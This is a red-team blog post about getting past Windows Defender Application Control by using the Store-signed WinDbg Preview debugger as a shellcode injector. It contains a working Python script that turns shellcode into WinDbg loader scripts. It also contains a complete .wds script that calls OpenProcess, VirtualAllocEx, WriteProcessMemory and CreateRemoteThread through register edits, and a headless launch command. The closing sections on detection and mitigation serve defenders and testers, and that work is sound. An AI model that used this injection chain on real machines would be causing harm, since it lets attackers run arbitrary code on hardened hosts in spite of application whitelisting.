---
title: 'Bypassing WDAC with WinDbg Preview'
author: Anubhav Gain
pubDatetime: 2025-04-07T00:00:00.000Z
slug: bypassing-wdac-with-windbg-preview
draft: false
featured: false
description: 'How a Microsoft-signed debugger from the Store (WinDbgX.exe) becomes a WDAC-trusted shellcode injector, and what defenders can do about it.'
tags:
- wdac
- windbg
- offensive-security
- shellcode-injection
- edr-bypass
- red-team
- windows-security
category: Offensive Security
lang: en
---

# Bypassing WDAC with WinDbg Preview

> A debugger is, by definition, a tool that controls execution flow and register state — which means it is, by definition, a tool that can execute arbitrary code. Put a Microsoft signature on it and hand it to a locked-down WDAC environment, and you have a problem.

Windows Defender Application Control (WDAC) is one of the most effective application-whitelisting controls on Windows. When configured well it blocks unsigned binaries, unsigned DLLs, and the usual LOLBins an attacker leans on. But every allow-list has an implicit trust boundary, and on a default WDAC deployment that boundary includes **anything Microsoft-signed** — including tools installed from the Microsoft Store.

This post walks through one of the more creative WDAC bypasses I have spent time with: using **WinDbg Preview** (`WinDbgX.exe`), the modern Store-distributed debugger, to inject shellcode into a remote process and recover code execution inside an otherwise locked-down environment. The technique builds directly on mr.d0x's earlier work abusing the console debugger `cdb.exe`; the novelty is the Store-signed binary that escapes Microsoft's own recommended block list.

## Table of Contents

1. [The Environment](#1-the-environment)
2. [Why WDAC Trusts WinDbg Preview](#2-why-wdac-trusts-windbg-preview)
3. [The Gap in Microsoft's Recommended Block List](#3-the-gap-in-microsofts-recommended-block-list)
4. [Concept: Debugger-as-Injector](#4-concept-debugger-as-injector)
5. [Turning Shellcode Into a `.wds` Script](#5-turning-shellcode-into-a-wds-script)
6. [Remote Process Injection via Register Manipulation](#6-remote-process-injection-via-register-manipulation)
7. [Detection Surface](#7-detection-surface)
8. [Mitigations](#8-mitigations)
9. [References](#9-references)

---

## 1. The Environment

Picture an assume-breached engagement: full control of a standard user workstation, but the box is genuinely well-hardened.

- A strict WDAC policy blocks unsigned executables and unsigned DLLs.
- Common LOLBins are explicitly denied.
- PowerShell is constrained; script execution is locked down.
- The Microsoft Store, however, is **not disabled**.

That last point is the crack. The Store lets a standard user install Microsoft-verified applications — and one of those is **WinDbg Preview**, whose main executable `WinDbgX.exe` carries a valid Microsoft signature. WDAC, trusting Microsoft binaries by default, happily lets it run.

## 2. Why WDAC Trusts WinDbg Preview

A WDAC policy is an XML document compiled into a binary code-integrity policy (`.cip`) that the kernel's Code Integrity component enforces. A typical enterprise policy grants trust on one or more of:

- **Publisher** rules (signing certificate chain + a partial hash of the leaf).
- **File path** rules.
- **WHQL / EKU / certificate root** rules.

Because `WinDbgX.exe` is signed by Microsoft and distributed through the Store, it satisfies the implicit Microsoft-publisher trust that most enterprise policies carry. The binary is allowed to execute — and once a debugger is running, application control has effectively lost. The policy never says "WinDbg may not inject shellcode"; it only says "WinDbg may run." Those two statements are not the same thing, and a debugger erases the difference.

## 3. The Gap in Microsoft's Recommended Block List

Microsoft publishes a **recommended driver/block list** for WDAC that is meant to cut down the obvious abuse primitives. The legacy `windbg.exe` and the console debugger `cdb.exe` are on it — and for good reason. mr.d0x's write-up *"The Power of Cdb.exe"* demonstrated that `cdb.exe` can:

- run shellcode from a script file,
- launch arbitrary executables,
- load DLLs,
- execute shell commands, and
- terminate security products,

all through debugger scripting primitives that do not require an unsigned payload to touch disk as an executable.

At the time of writing, the **Store-distributed `WinDbgX.exe` is not on that recommended block list**. That asymmetry — legacy debugger blocked, modern Store debugger allowed — is exactly what makes this bypass work in environments that followed Microsoft's guidance to the letter.

## 4. Concept: Debugger-as-Injector

The mental model is simple. A debugger exposes:

- **Memory allocation** primitives (`.dvalloc`),
- **Memory write** primitives (`eb` — enter bytes, `ed` — enter dwords, `eq` — enter qwords),
- **Register read/write** (`r`),
- **Execution control** (`g` to go, `bp` to set breakpoints), and
- **Pseudo-registers** (`$t0`, `$t1`, …) usable as scratch storage.

Those five primitives are a complete instruction set for calling arbitrary Win32 APIs. You do not need to ship an unsigned DLL. You allocate a buffer, write your shellcode into it byte by byte, then drive the target process's registers and instruction pointer to invoke `OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread`. WDAC never sees an unsigned image load; from the kernel's perspective, a signed Microsoft debugger is politely calling documented memory-management APIs.

## 5. Turning Shellcode Into a `.wds` Script

WinDbg scripts (`.wds`) are plain text, so the first job is to take a raw shellcode blob and emit a script that:

1. allocates a buffer inside the debuggee with `.dvalloc`,
2. captures the returned address into pseudo-register `$t0`, and
3. writes each shellcode byte with `eb @$t0+offset`.

A small converter makes this mechanical. This is my own implementation of the pattern; the original idea of byte-by-byte `eb` loading via a pseudo-register was popularised by mr.d0x and adapted for WinDbg by CerberSec.

```python
#!/usr/bin/env python3
"""shellcode_to_wds.py — render a raw shellcode blob as a WinDbg .wds loader.

Usage:  python shellcode_to_wds.py implant.bin
Output: writes shellcode.wds to the current directory.

The generated script:
  1. allocates N bytes in the debuggee (.dvalloc), storing the address in $t0
  2. writes the payload one byte at a time with `eb`
"""
import os
import sys

ENTRIES_PER_LINE = 4  # keep lines readable; WinDbg tolerates longer ones

def convert(bin_path: str, out_path: str = "shellcode.wds") -> None:
    size = os.path.getsize(bin_path)
    print(f"[*] shellcode size: {size} bytes (0x{size:X})")

    with open(bin_path, "rb") as src, open(out_path, "w") as out:
        # Allocate `size` bytes; .foreach scrapes the address out of the
        # .dvalloc output and stashes it in pseudo-register $t0.
        out.write(
            f".foreach /pS 5 (reg {{ .dvalloc 0x{size:X} }} ) {{ r @$t0 = reg }}\n"
        )

        chunk = []
        for off, byte in enumerate(src.read()):
            chunk.append(f";eb @$t0+{off:02X} {byte:02X}")
            if len(chunk) == ENTRIES_PER_LINE:
                out.write(" ".join(chunk) + "\n")
                chunk = []
        if chunk:
            out.write(" ".join(chunk) + "\n")

    print(f"[+] wrote {out_path}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("usage: shellcode_to_wds.py <shellcode.bin>")
        sys.exit(1)
    convert(sys.argv[1])
```

Running it against a tiny `calc.exe`-popping stub produces something like:

```
.foreach /pS 5 (reg { .dvalloc 0x6B } ) { r @$t0 = reg }
;eb @$t0+00 53 ;eb @$t0+01 56 ;eb @$t0+02 57 ;eb @$t0+03 55
;eb @$t0+04 54 ;eb @$t0+05 58 ;eb @$t0+06 66 ;eb @$t0+07 83
...
;eb @$t0+68 5B ;eb @$t0+69 C3
```

The leading `;` keeps each entry a no-op comment if it is ever echoed outside the script runner, which is harmless and keeps the file readable.

## 6. Remote Process Injection via Register Manipulation

With the shellcode staged in the debuggee at `$t0`, the rest is classic injection driven through the x64 calling convention:

| Argument | Register |
|---|---|
| 1st | `rcx` |
| 2nd | `rdx` |
| 3rd | `r8` |
| 4th | `r9` |
| 5th+ | stack (right-to-left), with 32-byte shadow space |

The strategy for each Win32 call is the same:

1. Save `rsp` (so we can restore the stack afterwards) and `rip` (as a return address).
2. Set a breakpoint on the saved `rip` so the debugger returns control to our script after the API completes.
3. Load the argument registers and any stack arguments.
4. Allocate shadow space and push the return address.
5. Point `rip` at the target API symbol and `g` (go).
6. On return, harvest the result from `rax` into a pseudo-register.

The full pattern (save it as `inject.wds` and prepend your generated shellcode at the top):

```
$$ === prepend generated shellcode.wds here ===

$$ --- args ---
$$ $$arg1 = target PID (hex)
$$ $$arg2 = shellcode size (hex)

$$ Save stack + return address
r @$t8 = rsp
r @$t9 = rip
bp @$t9

$$ OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
r rcx = 0x001F0FFF
r rdx = 0
r r8  = ${$arg1}
r rsp = rsp - 0x20
r rsp = rsp - 0x8
eq rsp @$t9
r rip = kernel32!OpenProcess
g
r @$t4 = rax            $$ handle

$$ VirtualAllocEx(h, NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
r rcx = @$t4
r rdx = 0
r r8  = ${$arg2}
r r9  = 0x3000
eq rsp+0x20 0x40
r rsp = rsp - 0x8
eq rsp @$t9
r rip = kernel32!VirtualAllocEx
g
r @$t5 = rax            $$ base address

$$ WriteProcessMemory(h, base, $t0, size, NULL)
r rcx = @$t4
r rdx = @$t5
r r8  = @$t0
r r9  = ${$arg2}
eq rsp+0x20 0
r rsp = rsp - 0x8
eq rsp @$t9
r rip = kernel32!WriteProcessMemory
g

$$ CreateRemoteThread(h, NULL, 0, base, NULL, NULL, NULL)
r rcx = @$t4
r rdx = 0
r r8  = 0
r r9  = @$t5
eq rsp+0x20 0
eq rsp+0x28 0
eq rsp+0x30 0
r rsp = rsp - 0x8
eq rsp @$t9
r rip = kernel32!CreateRemoteThread
g

$$ Restore the stack so the debuggee survives
r rsp = @$t8
```

Run it headlessly against a target PID:

```
WinDbgX.exe /accepteula /p <PID> /c "$$>a<inject.wds 0x<PID> 0x<SIZE>"
```

In practice the headless path can throw Microsoft's charming *"Unspecified error,"* so the reliable variant is to step through the same commands interactively in the debugger UI. Either way, the end state is the same: a thread executing attacker shellcode inside a WDAC-"protected" process, loaded entirely by a signed Microsoft binary.

## 7. Detection Surface

Everything here happens through legitimate debugger APIs, so the obvious sigma rules (unsigned image load, blocked LOLBin) stay silent. The tell-tales are behavioural:

- **`SetThreadContext` density.** Driving the debuggee one API at a time by rewriting `rip`, `rsp` and the argument registers translates under the hood into a burst of `SetThreadContext`/`GetThreadContext` calls originating from `WinDbgX.exe`. A single WinDbg instance issuing hundreds of context mutations on a process it did not originally attach to at boot is anomalous.
- **`WinDbgX.exe` as a parent.** In a hardened environment a Store debugger attaching to an unrelated production process is itself worth alerting on.
- **`.dvalloc` + `eb` patterns in ETW.** The DbgEng surface emits through ETW; the allocation-then-byte-write shape is distinctive.
- **Store app on a locked-down host.** If your baseline says "no Store apps," the presence of `WinDbgX.exe` is the detection.

## 8. Mitigations

- **Add `WinDbgX.exe` to the WDAC deny list** alongside the legacy debuggers that are already there. Treat every Microsoft debugger as a code-execution primitive by default.
- **Disable the Microsoft Store** on locked-down workstations (or restrict it to a curated allow-list of apps). This removes the installation vector entirely.
- **Monitor `SetThreadContext`/`GetThreadContext` volume** by `WinDbgX.exe` and alert on outliers.
- **Assume application control is a speed bump, not a wall.** Pair WDAC with behavioural detection (EDR), least privilege, and network segmentation so that a single bypass does not unwind the whole posture.

This is not a zero-day. It is a reminder that a tool's trustworthiness is not a property of its signature but of its capabilities — and a debugger's capabilities are total.

---

## 9. References

- [The Power of Cdb.exe — mr.d0x](https://mrd0x.com/the-power-of-cdb-debugging-tool/)
- [Bypass WDAC WinDbg Preview — CerberSec](https://cerbersec.com/2025/04/07/bypass-wdac-windbg-preview.html)
- [Ultimate WDAC Bypass List — bohops](https://github.com/bohops/UltimateWDACBypassList)
- [cdb on LOLBAS](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/)
- [Windows Defender Application Control — Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control)
- [Recommended driver/block rules — Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)
- [WinDbg command-line options — Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/windbg-command-line-preview)
